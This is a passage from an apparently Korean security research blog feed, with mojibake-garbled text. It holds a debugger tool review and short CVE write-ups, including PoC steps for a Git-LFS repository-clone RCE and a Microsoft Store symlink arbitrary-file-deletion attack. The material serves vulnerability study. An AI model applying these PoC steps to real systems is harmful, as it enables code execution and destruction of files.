ì£¼ì†Œë¥¼ í´ë¦­í•´ì„œ ìƒì„± í˜¹ì€ ì‚­ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¢Œì¸¡ì— break pointë“¤ì˜ ëª©ë¡ì„ ë³´ì—¬ì£¼ë©° ì²´í¬ë°•ìŠ¤ë¡œ í™œì„±í™” ì—¬ë¶€ë¥¼ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê¸°ì¡´ì— ì‚¬ìš©í•˜ë˜ pwndbgì—ì„œ ê°€ì¥ ì•„ì‰¬ì› ë˜ ì ì´ ë°”ë¡œ break point ê´€ë¦¬ê°€ ë²ˆê±°ë¡­ë‹¤ëŠ” ê²ƒì¸ë°, gdb-frontendëŠ” GUIë¡œ ì´ ê¸°ëŠ¥ì„ ì œê³µí•˜ë‹ˆ ìƒëŒ€ì ìœ¼ë¡œ ì¢€ ë” í¸ë¦¬í•©ë‹ˆë‹¤.</p><h1 id="ì“¸-ê°€ì¹˜ê°€-ìˆëŠ”ê°€"><a href="#ì“¸-ê°€ì¹˜ê°€-ìˆëŠ”ê°€" class="headerlink" title="ì“¸ ê°€ì¹˜ê°€ ìˆëŠ”ê°€?"></a>ì“¸ ê°€ì¹˜ê°€ ìˆëŠ”ê°€?</h1><p>í™•ì¥ì„±ì´ ì¢‹ë‹¤ëŠ” ì ì„ ë‚´ì„¸ìš°ê³  ìˆëŠ” ë§Œí¼ ì„¤ëª…í• ê²Œ ë§ì§„ ì•Šë„¤ìš”.</p><p>ìœ„ì—ì„œ ì„¤ëª…í•œ ê²ƒë“¤ì„ ì œì™¸í•˜ë©´ ëŒ€ë¶€ë¶„ì˜ ê¸°ëŠ¥ì„ gdbì— ì˜ì¡´í•˜ê³  ìˆê³ , ê·¸ëƒ¥ gdbë§Œ ì‚¬ìš©í•˜ëŠ” ê²ƒê³¼ í¬ê²Œ ë‹¤ë¥´ë‹¤ëŠ” ëŠë‚Œì€ ë°›ì§€ ëª»í–ˆìŠµë‹ˆë‹¤. gdbë¥¼ ì¨ë³´ì‹  ë¶„ë“¤ì€ ì•„ì‹œê² ì§€ë§Œ gdbë§Œì„ ì‚¬ìš©í•´ì„œ ë””ë²„ê¹…í•˜ëŠ” ë³€íƒœëŠ” ì—†ìŠµë‹ˆë‹¤. ì ì–´ë„ í•´í‚¹ ì”¬ì—ëŠ” ì—†ì„ ê±°ì•¼. ë©”ëª¨ë¦¬ë‚˜ registerê°’ì˜ ë³€í™”ì— ì§‘ì¤‘í•˜ë©° ë””ë²„ê¹…í•˜ëŠ” ì €ì—ê²Œ instruction í•˜ë‚˜ ì‹¤í–‰í•  ë•Œë§ˆë‹¤ <code>info reg</code> ê°™ì€ ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•˜ë¼ê³  í•œë‹¤ë©´â€¦ ì–´í›„â€¦</p><p>ê·¸ëŸ° ì ì„ gdb-frontendê°€ ê°œì„ í•´ì£¼ì§„ ì•ŠìŠµë‹ˆë‹¤. UIê°€ ì´ì˜ê¸´ í•˜ì§€ë§Œ ì €ì—ê²Œ í•„ìš”í•œ ë¶€ë¶„ì€ êµ¬í˜„ì´ ì•ˆë¼ ìˆìœ¼ë‹ˆ â€˜ì´ìœ ì“°ë ˆê¸°â€™ë¼ëŠ” ë‹¨ì–´ëŠ” ì´ëŸ´ ë•Œ ì“°ëŠ” ë§ ì´ê² ì£ . ì •ì‘ DisassemblyëŠ” í™”ë©´ì— ë‘ ë²ˆì´ë‚˜ ì¶œë ¥í•´ì¤ë‹ˆë‹¤. ã…ã…</p><blockquote><p>L0ch æ›° : ì´ìœ ì“°ë ˆê¸°ë„¤ ì´ìœ ì“°ë ˆê¸°</p></blockquote><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/8.png"></p><p>gdb-frontendë¡œ CTFë¬¸ì œ í•˜ë‚˜ í’€ê³ , ì—°êµ¬ ê¸€ì„ ê°€ì¥í•œ write-upì„ ì‘ì„±í•˜ë ¤ í–ˆì§€ë§Œ ë„ì €íˆ gdb-frontendë§Œìœ¼ë¡œ ë¬¸ì œë¥¼ í’€ ìˆœ ì—†ì„ ê±° ê°™ë„¤ìš”. ê·¸ë˜ì„œ ì¼ë§ì˜ í¬ë§ì„ ê°–ê³  pwndbgì™€ ì—°ë™í•´ë´¤ìŠµë‹ˆë‹¤ë§Œ, gdb-frontendëŠ” ì£¼ê°ì „ë„ë¥¼ í—ˆìš©í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. gdb-frontendì˜ uiê°€ ì—†ì–´ì§ˆ ì •ë„ë¡œ terminalì˜ í¬ê¸°ë¥¼ í‚¤ì›Œì•¼ í•˜ê³ ,</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/9.png"></p><p>ë¬´ì—‡ë³´ë‹¤ gdb-frontendê°€ ë»—ì–´ë²„ë¦½ë‹ˆë‹¤. ì¼ë‹¨ ì œê°€ ì‚¬ìš©í•˜ë©´ì„œ crash ë‚˜ëŠ” ìƒí™©ì€ 2ê°€ì§€ ìˆì—ˆìŠµë‹ˆë‹¤.</p><ol><li>ë¶„ì„í•˜ê³  ìˆëŠ” í”„ë¡œì„¸ìŠ¤ê°€ segmentation faultë¥¼ ì¼ìœ¼í‚¬ ë•Œ</li><li>ì¡´ì¬í•˜ëŠ” í”„ë¡œì„¸ìŠ¤ì— attach í•  ë•Œ</li></ol><p>ì €ì—ê² ì´ ë‘ ê°€ì§€ ìƒí™© ëª¨ë‘ ë§¤ìš° í° ë‹¨ì ì…ë‹ˆë‹¤. python exploit ì½”ë“œì— ë”°ë¼ ë™ì‘í•˜ê³  ìˆëŠ” í”„ë¡œì„¸ìŠ¤ì— gdbë¥¼ attach í•´ ë¶„ì„í•˜ëŠ” ê²ƒì´ ì£¼ëœ ì‚¬ìš©ë°©ë²•ì¸ë°, ê·¸ê²Œ ì•ˆëœë‹¤ë‹ˆìš”â€¦ ê·¸ë¦¬ê³  segmentation faultì— ëŒ€í•œ ì–´ë– í•œ ì •ë³´ë„ ì–»ì„ ìˆ˜ ì—†ìœ¼ë‹ˆ ì·¨ì•½ì  ì°¾ëŠ” ì…ì¥ì—ì„  í™”ë”±ì§€ê°€ ì•ˆ ë‚  ìˆ˜ê°€ ì—†ìŠµë‹ˆë‹¤.</p><h1 id="ë§ˆë¬´ë¦¬"><a href="#ë§ˆë¬´ë¦¬" class="headerlink" title="ë§ˆë¬´ë¦¬"></a>ë§ˆë¬´ë¦¬</h1><ol><li>gdbì˜ ê¸°ëŠ¥ì„ guië¡œ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤? <strong>No</strong><ul><li>ê²°êµ­ ëª¨ë“  ë™ì‘ì€ gdb terminalì„ í†µí•´ ì´ë£¨ì–´ì§.</li><li>guië¡œ gdbë¥¼ ë‹¤ë£¨ëŠ” ê²ƒì´ ì•„ë‹ˆë¼, gdbì˜ ê²°ê´ê°’ì„ guië¡œ ë³´ì—¬ì£¼ëŠ” í”ŒëŸ¬ê·¸ì¸</li><li>chromeìœ¼ë¡œ gdbë¥¼ ì‚¬ìš©í•˜ëŠ” ê±°ë¼ ì˜¤íˆë ¤ ë¶ˆí¸í•¨</li></ul></li><li>pwnableì— ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤? <strong>No</strong></li></ol>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>gdb-frontend</tag>
      
      <tag>pwndbg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-27955: Git-LFS RCE Exploit</title>
    <link href="/2020/11/06/l0ch/2020-11-06/"/>
    <url>/2020/11/06/l0ch/2020-11-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html">Git-LFS RCE Exploit CVE-2020-27955</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Git &lt;= 2.29.2-git-lfs</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ëŒ€ìš©ëŸ‰ íŒŒì¼ì„ ì—…ë¡œë“œ í•˜ê¸° ìœ„í•´ githubì—ì„œ ê°œë°œí•œ extensionì¸ git-lfs(Large File Storage)ì—ì„œ Windowsë¥¼ ëŒ€ìƒìœ¼ë¡œ ì›ê²© ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì„ ì•…ìš©í•˜ì—¬ git-lfsë¡œ ì—…ë¡œë“œí•œ íŒŒì¼ì´ ìˆëŠ” ì €ì¥ì†Œì—ì„œ Windows ì‹œìŠ¤í…œì˜ í”¼í•´ìê°€ ì €ì¥ì†Œë¥¼ ë³µì œí•  ë•Œ ìƒí˜¸ì‘ìš© ì—†ì´ ê³µê²©ìì˜ ì•…ì„± ë°”ì´ë„ˆë¦¬ê°€ ì‹¤í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì˜ PoCëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><p>ê³µê²©ìëŠ” ì €ì¥ì†Œì— ì‹¤í–‰í•  ëª…ë ¹ì–´ë¥¼ í¬í•¨í•œ <code>git.*</code> ì´ë¦„ì˜ windows ë°”ì´ë„ˆë¦¬ í˜•ì‹ íŒŒì¼ì„ ì¶”ê°€í•©ë‹ˆë‹¤.</p><pre><code class="hljs bash">git.bat : @<span class="hljs-built_in">echo</span> git-lfs RCE exploit!!git add git.bat</code></pre></li><li><p>ì €ì¥ì†Œì— lfs íŒŒì¼ì„ ì¶”ê°€í•©ë‹ˆë‹¤.</p><pre><code class="hljs bash">git lfs track <span class="hljs-string">&quot;* .dat&quot;</span> git add .gitattributes<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;git exploit PoC&quot;</span>&gt; lfs.datgit add lfs.dat</code></pre></li><li><p>ë°”ì´ë„ˆë¦¬ì™€ lfs íŒŒì¼ì„ ì»¤ë°‹í•˜ê³  ì›ê²© ì €ì¥ì†Œì— ì—…ë¡œë“œí•©ë‹ˆë‹¤.</p><pre><code class="hljs bash">git commit -a -m <span class="hljs-string">&quot;git-lfs exploit&quot;</span>git remote add origin https://repository_urlgit push -u origin master</code></pre></li><li><p>Windows ì‹œìŠ¤í…œì—ì„œ cloneí•  ë•Œ git-lfs ì·¨ì•½ì ì´ íŠ¸ë¦¬ê±°ë˜ì–´ ê¸°ì¡´ git ë°”ì´ë„ˆë¦¬ ëŒ€ì‹  ê³µê²©ìì˜ ì›ê²© ì €ì¥ì†Œì—ì„œ cloneí•œ ì•…ì„± <code>git.bat</code>ì´ ì‚¬ìš©ì ìƒí˜¸ì‘ìš© ì—†ì´ ì‹¤í–‰ë©ë‹ˆë‹¤.</p><pre><code class="hljs bash">PowerShell&gt; git <span class="hljs-built_in">clone</span> https://repository_urlgit-lfs RCE exploit!!</code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>git</tag>
      
      <tag>git lfs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-13935: Apache Tomcat Websocket ì·¨ì•½ì </title>
    <link href="/2020/11/05/idioth/2020-11-05/"/>
    <url>/2020/11/05/idioth/2020-11-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.redteam-pentesting.de/2020/websocket-vulnerability-tomcat/">DIVING INTO A WEBSOCKET VULNERABILITY IN APACHE TOMCAT</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache Tomcat<ul><li>10.0.0-M1 ~ 10.0.0-M6</li><li>9.0.0.M1 ~ 9.0.36</li><li>8.5.0 ~ 8.5.56</li><li>7.0.27 ~ 7.0.104</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>í•´ë‹¹ ì·¨ì•½ì ì€ Apache Tomcatì˜ WebSocket í”„ë ˆì„ì—ì„œ <code>payloadLength</code>ì— ì˜í•´ ë¬´í•œ ë£¨í”„ê°€ íŠ¸ë¦¬ê±° ë˜ì–´ DoS ê³µê²©ìœ¼ë¡œ ì—°ê²°ë  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤.</p><p><a href="https://tools.ietf.org/html/rfc6455#section-5.2">RFC6455</a>ì˜ WebSocket í”„ë ˆì„ì—ì„œ payload length í•„ë“œê°€ 127(2ì§„ìˆ˜ 1111111)ì´ë©´ 64ë¹„íŠ¸ í™•ì¥ payload lengthë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ payload lengthëŠ” 64ë¹„íŠ¸ unsigned integerì´ì§€ë§Œ RFCì—ì„œëŠ” ìµœìƒìœ„ ë¹„íŠ¸ê°€ í•­ìƒ 0ì´ ë˜ë„ë¡ ìš”êµ¬í•©ë‹ˆë‹¤.</p><p>ë”°ë¼ì„œ payload length í•„ë“œë¥¼ 127ë¡œ ì„¤ì •í•´ì¤€ í›„ ë‹¤ìŒ 8ë°”ì´íŠ¸ì˜ MSBë¥¼ 1ë¡œ ì„¤ì •í•´ì£¼ê¸°ë§Œ í•˜ë©´ DoS ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ê³¼ ê´€ë ¨ëœ íŒ¨ì¹˜ëŠ” <code>payloadLength</code>ê°€ ìŒìˆ˜ê°€ ë  ê²½ìš° exceptionì„ ë°œìƒì‹œí‚¤ë„ë¡ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs java"><span class="hljs-comment">// The most significant bit of those 8 bytes is required to be zero</span><span class="hljs-comment">// (see RFC 6455, section 5.2). If the most significant bit is set,</span><span class="hljs-comment">// the resulting payload length will be negative so test for that.</span><span class="hljs-keyword">if</span> (payloadLength &lt; <span class="hljs-number">0</span>) &#123;    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> WsIOException(        <span class="hljs-keyword">new</span> CloseReason(            CloseCodes.PROTOCOL_ERROR,            sm.getString(<span class="hljs-string">&quot;wsFrame.payloadMsbInvalid&quot;</span>)        )    );&#125;</code></pre><p>í•´ë‹¹ ì·¨ì•½ì ì— ê´€í•œ PoC CodeëŠ” <a href="https://github.com/RedTeamPentesting/CVE-2020-13935">ì—¬ê¸°</a>ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>idioth</tag>
      
      <tag>apache</tag>
      
      <tag>tomcat</tag>
      
      <tag>websocket</tag>
      
      <tag>dos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-27194: eBPF verifier bug</title>
    <link href="/2020/11/04/fabu1ous/2020-11-04/"/>
    <url>/2020/11/04/fabu1ous/2020-11-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/">Fuzzing for eBPF JIT bugs in the Linux kernel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Linux kernel</p><p>eBPF</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>eBPFëŠ” ëŸ°íƒ€ì„ ì¤‘ ì•ˆì „í•˜ê²Œ ì»¤ë„ ì½”ë“œë¥¼ ì‚½ì…í•˜ê¸° ìœ„í•´ Verifierì™€ BPF instructionì„ ì‚¬ìš©í•©ë‹ˆë‹¤. VerifierëŠ” ë ˆì§€ìŠ¤í„°ì˜ ê°’ì˜ ë³€í™”ì™€ ê·¸ ê°’ë“¤ì˜ í—ˆìš© ë²”ìœ„(ì´í•˜ range)ë“±ì„ íŠ¸ë˜í‚¹í•´  memory loadì™€ storeì˜ out-of-bound ì—¬ë¶€ë¥¼ ê²€ì‚¬í•˜ë©°,  32-bitì™€ 64-bit ê°ê°ì˜ rangeë¥¼ êµ¬ë¶„í•´ ê´€ë¦¬í•©ë‹ˆë‹¤. ORì—°ì‚°ì´ ëë‚œ í›„ ê·¸ì— ë§ê²Œ  32-bit ë ˆì§€ìŠ¤í„°ì˜ rangeë¥¼ ì—…ë°ì´íŠ¸í•˜ëŠ” <code>scalar32_min_max_or()</code>í•¨ìˆ˜ëŠ” ì´ êµ¬ë¶„ì´ í™•ì‹¤í•˜ì§€ ëª»í•˜ê³ , ë²„ê·¸ë¥¼ ìœ ë°œí•©ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-comment">/* ORing two positives gives a positive, so safe to</span><span class="hljs-comment">* cast result into s64.</span><span class="hljs-comment">*/</span>dst_reg-&gt;s32_min_value = dst_reg-&gt;umin_value;dst_reg-&gt;s32_max_value = dst_reg-&gt;umax_value;</code></pre><p>64-bit rangeë¥¼ 32-bit rangeë¡œ casting í•˜ëŠ” <code>scalar32_min_max_or()</code>ì˜ ì½”ë“œ ë¶€ë¶„ì…ë‹ˆë‹¤. VerifierëŠ” <code>s32_min_value</code>ì™€ <code>s32_max_value</code>ë¥¼ ì´ìš©í•´ rangeë¥¼ íŠ¸ë˜í‚¹ í•˜ëŠ”ë°, ë§Œì•½ ì´ ë‘ ê°’ì´ ê°™ë‹¤ë©´ ë ˆì§€ìŠ¤í„° ê°’ì„ ìƒìˆ˜ë¡œ ì¸ì‹í•˜ê³  ê·¸ì— ë”°ë¼ ì½”ë“œê°€ ë¶„ê¸°í•©ë‹ˆë‹¤. </p><p>ë§Œì•½ ìœ„ ì½”ë“œì—ì„œ <code>dst_reg-&gt;umin_value</code>ê°€ 1ì´ê³ , <code>dst_reg-&gt;umax_value</code>ê°€ 25769803777ì´ë¼ë©´ <code>dst_reg-&gt;s32_min_value</code>ì™€ <code>dst_reg-&gt;s32_max_value</code> ë‘˜ ë‹¤ 1ë¡œ ì €ì¥ë˜ì–´ ë ˆì§€ìŠ¤í„°ë¥¼ rangeê°€ ì•„ë‹Œ ìƒìˆ˜ë¡œ ì¸ì‹í•˜ê²Œ ë©ë‹ˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.sosconhistory.net/soscon2018/pdf/day2_1100_3.pdf">https://www.sosconhistory.net/soscon2018/pdf/day2_1100_3.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>ebpf</tag>
      
      <tag>bpf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-16877: Exploiting Microsoft Store Games</title>
    <link href="/2020/11/03/l0ch/11-03_1day1line/"/>
    <url>/2020/11/03/l0ch/11-03_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.ioactive.com/2020/11/cve-2020-16877-exploiting-microsoft.html">CVE-2020-16877: Exploiting Microsoft Store Games</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 - Microsoft Store</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Storeì—ì„œ ë°°í¬í•˜ëŠ” UWP(Universal Windows platform) ì•±ì€ ì¼ë°˜ì ìœ¼ë¡œ  <code>C:\Program Files\WindowsApps</code> ë””ë ‰í„°ë¦¬ì— ì €ì¥ë˜ì–´ ì¼ë°˜ì ì¸ ê¶Œí•œìœ¼ë¡œ ì ‘ê·¼í•  ìˆ˜ ì—†ìœ¼ë©° Appxë¼ëŠ” í˜•ì‹ì˜ íŒŒì¼ì„ ì•± ì„¤ì¹˜ ê´€ë¦¬ì í”„ë¡œê·¸ë¨ì„ í†µí•´ì„œë§Œ ì„¤ì¹˜/ì œê±°ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. </p><p>ì§€ë‚œ 6ì›” MicrosoftëŠ” ê²Œì„ ì•±ì˜ ëª¨ë“œë¥¼ ì§€ì›í•˜ê¸° ìœ„í•´ ìˆ˜ì •ì´ ê°€ëŠ¥í•œ Windows ì•±ì„ í˜¸ìŠ¤íŒ… í•˜ëŠ” ë””ë ‰í„°ë¦¬ì¸ <code>C:\ProgramFiles\ModifiableWindowsApps</code>ì„ ì¶”ê°€í–ˆëŠ”ë°, ì´ ê¸°ëŠ¥ì— ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ì‚¬ìš©í•´ arbitrary file deletion ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>PoCëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>ë‹¤ë¥¸ ì‹œìŠ¤í…œ ë“œë¼ì´ë¸Œ <code>D:\</code>ì— pivot í•  ê²½ë¡œë¥¼ ìƒì„±í•˜ê³  windows ì €ì¥ì†Œ ì„¤ì •ì„ í†µí•´ ê¸°ë³¸ ì €ì¥ ìœ„ì¹˜ë¥¼ <code>D:\</code> ë¡œ ë³€ê²½í•©ë‹ˆë‹¤</li></ol><pre><code class="hljs powershell"><span class="hljs-built_in">md</span> <span class="hljs-string">&quot;D :\Program Files&quot;</span><span class="hljs-built_in">md</span> <span class="hljs-string">&quot;D :\pivot&quot;</span></code></pre><ol start="2"><li><p>Microsoft Storeì—ì„œ ëª¨ë“œ ì§€ì›ì´ ë˜ëŠ” ê²Œì„ ì•±ì„ ë°›ì•„ ì„¤ì¹˜í•˜ë©´ <code>D:\Program Files\ModifiableWindowsApps</code> í•˜ìœ„ì— í•´ë‹¹ ì•±ì˜ ë””ë ‰í„°ë¦¬ê°€ ìƒì„±ë©ë‹ˆë‹¤.</p></li><li><p>ì´ì¤‘ ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ìƒì„±í•´ ì•±ì˜ ë””ë ‰í„°ë¦¬ê°€ ì‹¬ë³¼ë¦­ ë§í¬ì˜ êµì°¨ì ì´ ë˜ë„ë¡ ë§Œë“¤ê³ , ì‹¬ë³¼ë¦­ ë§í¬ë¡œ ë¦¬ë””ë ‰ì…˜ í•  ìµœì¢… ë””ë ‰í„°ë¦¬ëŠ” ì‚­ì œí•  ì‹œìŠ¤í…œ ê¶Œí•œì˜ ë””ë ‰í„°ë¦¬ë¡œ ì„¤ì •í•©ë‹ˆë‹¤.</p></li></ol><pre><code class="hljs powershell">mklink / J <span class="hljs-string">&quot;D:\Program Files\ModifiableWindowsApps&quot;</span> <span class="hljs-string">&quot;D:\pivot&quot;</span>mklink / J <span class="hljs-string">&quot;D:\pivot\Game_App&quot;</span> <span class="hljs-string">&quot;C:\arbitrary_path\to_delete&quot;</span></code></pre><ol start="4"><li>ì•±ì„ ì‚­ì œí•˜ë©´ ì´ì¤‘ ì‹¬ë³¼ë¦­ ë§í¬ë¡œ ì¸í•´ ì‹œìŠ¤í…œ ê¶Œí•œìœ¼ë¡œ ì„ì˜ ê²½ë¡œì˜ íŒŒì¼ì´ ì‚­ì œë©ë‹ˆë‹¤.</li></ol><p>ì‘ì„±ìëŠ” ì‹œìŠ¤í…œ ê¶Œí•œì˜ ì‰˜ì„ ì‹¤í–‰í•˜ëŠ” ë°ëª¨ ì˜ìƒ ë˜í•œ ê³µê°œí–ˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file deletion</tag>
      
      <tag>microsoft store</tag>
      
      <tag>symbolic link</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-17087: Windows kernel cng.sys pool-based buffer overflow</title>
    <link href="/2020/11/02/idioth/2020-11-02/"/>
    <url>/2020/11/02/idioth/2020-11-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2104">Windows Kernel cng.sys pool-based buffer overflow in IOCTL 0x390400</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 10 1903(64-bit)</li><li>Maybe since at least Windows 7</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ìœˆë„ìš° ì»¤ë„ ì•”í˜¸í™” ë“œë¼ì´ë²„ì¸ cng.sysì—ì„œ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ IOCTL 0x390400 ì²˜ë¦¬ ì¤‘ <code>cng!CfgAdtpFormatPropertyBlock</code> í•¨ìˆ˜ì—ì„œ 16-bit integer truncationì— ì˜í•´ ë°œìƒí–ˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs c">CONST USHORT DestinationSize = (USHORT)(<span class="hljs-number">6</span> * SourceLength);PWCHAR OutputBuffer = BCryptAlloc(DestinationSize);<span class="hljs-keyword">for</span> (USHORT i = <span class="hljs-number">0</span>; i &lt; SourceLength; i++) &#123;*OutputBuffer++ = <span class="hljs-string">&quot;0123456789abcdef&quot;</span>[*SourceBuffer &gt;&gt; <span class="hljs-number">4</span>];*OutputBuffer++ = <span class="hljs-string">&quot;0123456789abcdef&quot;</span>[*SourceBuffer &amp; <span class="hljs-number">0xF</span>];*OutputBuffer++ = <span class="hljs-string">&#x27; &#x27;</span>;SourceBuffer++;&#125;</code></pre><p><code>SourceLength</code>ì˜ ê°’ì´ <code>0x2AAB</code>ë³´ë‹¤ í¬ê±°ë‚˜ ê°™ìœ¼ë©´ NonPagedPoolì— ë¹„ì •ìƒì ìœ¼ë¡œ ì‘ì€ ë²„í¼ê°€ í• ë‹¹ë˜ê³  binary-to-hex ë³€í™˜ ë£¨í”„ì— ì˜í•´ ì˜¤ë²„ í”Œë¡œìš°ê°€ ë°œìƒí•©ë‹ˆë‹¤. ìœˆë„ìš° 10 1903ì—ì„œ í…ŒìŠ¤íŠ¸ë˜ì—ˆì§€ë§Œ ìœˆë„ìš° 7ë¶€í„° ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” ê²ƒìœ¼ë¡œ ì˜ˆìƒë˜ë©° í˜„ì¬ ì·¨ì•½ì ì´ ì•…ìš©ë˜ê³  ìˆë‹¤ê³  í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>ioctl</tag>
      
      <tag>cng.sys</tag>
      
      <tag>buffer overflow</tag>
      
      <tag>integer overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] CVE-2020-1464: GlueBall</title>
    <link href="/2020/11/01/l0ch/cve-2020-1464/"/>
    <url>/2020/11/01/l0ch/cve-2020-1464/</url>
    
    <content type="html"><![CDATA[<p>ì•ˆë…•í•˜ì„¸ìš”! ê¸€ ì“°ëŠ” ê±¸ ë¯¸ë£¨ê³  ë¯¸ë£¨ë‹¤ idioth íŒ€ì¥ë‹˜ì˜ êµ¬ë°•ì— ê²¨ìš°ê²¨ìš° ì²« ê¸€ì„ ì“°ëŠ” L0chì…ë‹ˆë‹¤. </p><p><del>ì•…ë• ìƒì‚¬ ìš°ìš° ê¸¸ ê°€ë‹¤ ë ˆê³  ë¸”ë¡ì´ë‚˜ ë°Ÿì•„ë¼</del> </p><p>ì˜¤ëŠ˜ì€ Windowsì˜ ì·¨ì•½ì  í•˜ë‚˜ë¥¼ ë“¤ê³  ì™”ëŠ”ë°ìš”, í•¨ê»˜ ë³´ì‹¤ê¹Œìš”? </p><h1 id="ê°œìš”"><a href="#ê°œìš”" class="headerlink" title="ê°œìš”"></a>ê°œìš”</h1><p>GlueBallì´ë¼ê³  ë¶ˆë¦¬ëŠ” CVE-2020-1464ëŠ” 2018ë…„ 9ì›”ì— ì œë³´ë˜ì—ˆìŠµë‹ˆë‹¤. ê·¼ë° ë§ˆì†Œ ì¹œêµ¬ë“¤ì´ íŒ¨ì¹˜ ì•ˆ í•˜ê³  ìˆë‹¤ê°€ 2ë…„ì´ ì§€ë‚œ ìµœê·¼ patch tuesdayë¼ê³  ë¶ˆë¦¬ëŠ” ì •ê¸° íŒ¨ì¹˜ì—ì„œ íŒ¨ì¹˜ê°€ ë˜ì—ˆâ€¦? ì™œ ì§€ê¸ˆ ì™€ì„œ???</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img1.png"></p><p>ì´ìƒí•˜ê¸´ 